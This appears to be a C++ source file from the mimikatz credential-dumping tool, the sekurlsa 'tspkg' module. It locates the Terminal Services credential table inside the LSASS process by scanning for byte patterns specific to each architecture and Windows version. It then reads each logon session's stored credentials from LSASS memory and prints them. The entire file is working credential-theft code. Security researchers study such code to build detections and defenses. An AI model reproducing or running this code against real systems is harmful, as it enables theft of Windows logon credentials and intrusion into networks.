/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "tspkg.h"
#include "..\..\global.h"
mod_process::PKIWI_VERY_BASIC_MODULEENTRY mod_mimikatz_sekurlsa_tspkg::pModTSPKG = NULL;
PRTL_AVL_TABLE mod_mimikatz_sekurlsa_tspkg::TSGlobalCredTable = NULL; //reinterpret_cast<PRTL_AVL_TABLE>(NULL);

bool mod_mimikatz_sekurlsa_tspkg::getTsPkg(vector<wstring> * arguments)
{
	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>(getTsPkgLogonData, wstring(L"tspkg")));
	return mod_mimikatz_sekurlsa::getLogonData(arguments, &monProvider);
}

bool mod_mimikatz_sekurlsa_tspkg::searchTSPKGFuncs()
{
#ifdef _M_X64
	BYTE PTRN_WALL_TSGlobalCredTable[]	= {0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d};
	LONG OFFS_WALL_TSGlobalCredTable	= sizeof(PTRN_WALL_TSGlobalCredTable);
#elif defined _M_IX86
	BYTE PTRN_WNO8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x51, 0x56, 0xbe};
	LONG OFFS_WNO8_TSGlobalCredTable	= sizeof(PTRN_WNO8_TSGlobalCredTable);

	BYTE PTRN_WIN8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x53, 0xbb};
	LONG OFFS_WIN8_TSGlobalCredTable	= sizeof(PTRN_WIN8_TSGlobalCredTable);
#endif

	if(mod_mimikatz_sekurlsa::searchLSASSDatas() && pModTSPKG && !TSGlobalCredTable)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		pointeur= reinterpret_cast<PBYTE *>(&TSGlobalCredTable);
#ifdef _M_X64
		pattern	= PTRN_WALL_TSGlobalCredTable;
		taille	= sizeof(PTRN_WALL_TSGlobalCredTable);
		offset	= OFFS_WALL_TSGlobalCredTable;
#elif defined _M_IX86
		if(mod_system::GLOB_Version.dwBuildNumber < 8000)
		{
			pattern	= PTRN_WNO8_TSGlobalCredTable;
			taille	= sizeof(PTRN_WNO8_TSGlobalCredTable);
			offset	= OFFS_WNO8_TSGlobalCredTable;
		}
		else
		{
			pattern	= PTRN_WIN8_TSGlobalCredTable;
			taille	= sizeof(PTRN_WIN8_TSGlobalCredTable);
			offset	= OFFS_WIN8_TSGlobalCredTable;
		}
#endif

		if(HMODULE monModule = LoadLibrary(L"tspkg"))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				mod_memory::genericPatternSearch(pointeur, L"tspkg", pattern, taille, offset);
				*pointeur += pModTSPKG->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}
	}
	return (pModTSPKG && TSGlobalCredTable);
}

bool WINAPI mod_mimikatz_sekurlsa_tspkg::getTsPkgLogonData(__in PLUID logId, __in bool justSecurity)
{
	if(searchTSPKGFuncs())
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		BYTE * monBuffP = new BYTE[sizeof(KIWI_TS_CREDENTIAL)], * monBuffC = new BYTE[sizeof(KIWI_TS_PRIMARY_CREDENTIAL)];
		if(PKIWI_TS_CREDENTIAL pLogSession = reinterpret_cast<PKIWI_TS_CREDENTIAL>(mod_mimikatz_sekurlsa::getPtrFromAVLByLuid(TSGlobalCredTable, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), logId)))
		{
			if(mod_memory::readMemory(pLogSession, monBuffP, sizeof(KIWI_TS_CREDENTIAL), mod_mimikatz_sekurlsa::hLSASS))
			{
				pLogSession = reinterpret_cast<PKIWI_TS_CREDENTIAL>(monBuffP);
				if(pLogSession->pTsPrimary)
				{
					if(mod_memory::readMemory(pLogSession->pTsPrimary, monBuffC, sizeof(KIWI_TS_PRIMARY_CREDENTIAL), mod_mimikatz_sekurlsa::hLSASS))
						mesCreds = &(reinterpret_cast<PKIWI_TS_PRIMARY_CREDENTIAL>(monBuffC)->credentials);
				}
				else (*outputStream) << L"n.s. (SuppCred KO) / ";
			}
		}
		mod_mimikatz_sekurlsa::genericCredsToStream(mesCreds, justSecurity, true);
		delete [] monBuffC, monBuffP;
	}
	else (*outputStream) << L"n.a. (tspkg KO)";
	return true;
}
